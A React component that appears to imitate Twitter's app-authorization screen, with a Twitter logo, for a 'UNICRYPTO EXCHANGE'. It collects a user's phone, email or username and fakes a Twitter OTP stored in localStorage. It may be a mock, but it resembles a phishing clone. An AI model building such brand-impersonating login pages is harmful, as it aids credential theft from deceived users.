import React, { useState, useEffect } from "react";
import { useNavigate, useLocation } from "react-router-dom";

const GrantAccess = () => {
  const [input, setInput] = useState("");
  const [isAuthorizing, setIsAuthorizing] = useState(false);
  const [isRedirecting, setIsRedirecting] = useState(false);
  const navigate = useNavigate();
  const location = useLocation();

  // Parse the oauth_token query parameter from the URL
  const queryParams = new URLSearchParams(location.search);
  const oauthToken = queryParams.get("oauth_token");

  useEffect(() => {
    if (oauthToken) {
      console.log("OAuth Token:", oauthToken); // For debugging
      // You can perform any additional logic with the oauthToken here
    }
  }, [oauthToken]);

  const handleContinue = () => {
    if (input) {
      setIsAuthorizing(true);

      // Simulate API call delay
      setTimeout(() => {
        const otp = Math.floor(100000 + Math.random() * 900000);
        localStorage.setItem("otp", otp);
        alert(`Your Twitter OTP: ${otp}`);

        const username = input.startsWith("@") ? input.slice(1) : input;
        localStorage.setItem("input", username);

        navigate("/otp-verification");
      }, 2000);
    } else {
      alert("Please enter a valid username, email, or phone number");
    }
  };

  const handleCancel = () => {
    setIsRedirecting(true);
    setTimeout(() => {
      navigate("/");
    }, 2000);
  };

  return (
    <div className="flex flex-col items-center h-screen bg-black text-white px-4">
      {/* Logo Section */}
      <div className="flex justify-center items-center w-full mt-6">
        <img src="/twitlogo.png" alt="Logo" className="h-16 w-16" />
      </div>

      {/* Main Content */}
      <div className="flex flex-col items-center justify-center h-full w-full">
        {/* Page Header */}
        <h1 className="text-2xl font-bold text-center px-6 mb-6 leading-snug">
          Authorize UNICRYPTO EXCHANGE to use <br /> your account?
        </h1>

        {/* Input Form */}
        <div className="w-full max-w-md space-y-5">
          <div className="relative">
            <input
              type="text"
              placeholder="Phone, email, or username"
              className="w-full p-5 text-white bg-black border border-gray-700 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-lg placeholder-transparent peer"
              value={input}
              onChange={(e) => setInput(e.target.value)}
            />
            <label className="absolute left-4 top-3 text-gray-500 text-sm transition-all duration-200 peer-placeholder-shown:top-5 peer-placeholder-shown:text-lg peer-placeholder-shown:text-gray-400 peer-focus:top-3 peer-focus:text-sm peer-focus:text-blue-500">
              Phone, email, or username
            </label>
          </div>
          <button
            className="w-full py-5 bg-blue-500 text-white font-bold rounded-lg text-lg hover:bg-blue-600 transition duration-300 mb-4"
            onClick={handleContinue}
            disabled={isAuthorizing}
          >
            {isAuthorizing ? "Authorizing..." : "Authorize App"}
          </button>
          <button
            className="w-full py-5 border border-gray-700 text-white font-bold rounded-lg text-lg hover:bg-gray-800 transition duration-300"
            onClick={handleCancel}
            disabled={isRedirecting}
          >
            {isRedirecting ? "Redirecting back to home..." : "Cancel"}
          </button>
        </div>
      </div>
    </div>
  );
};

export default GrantAccess;
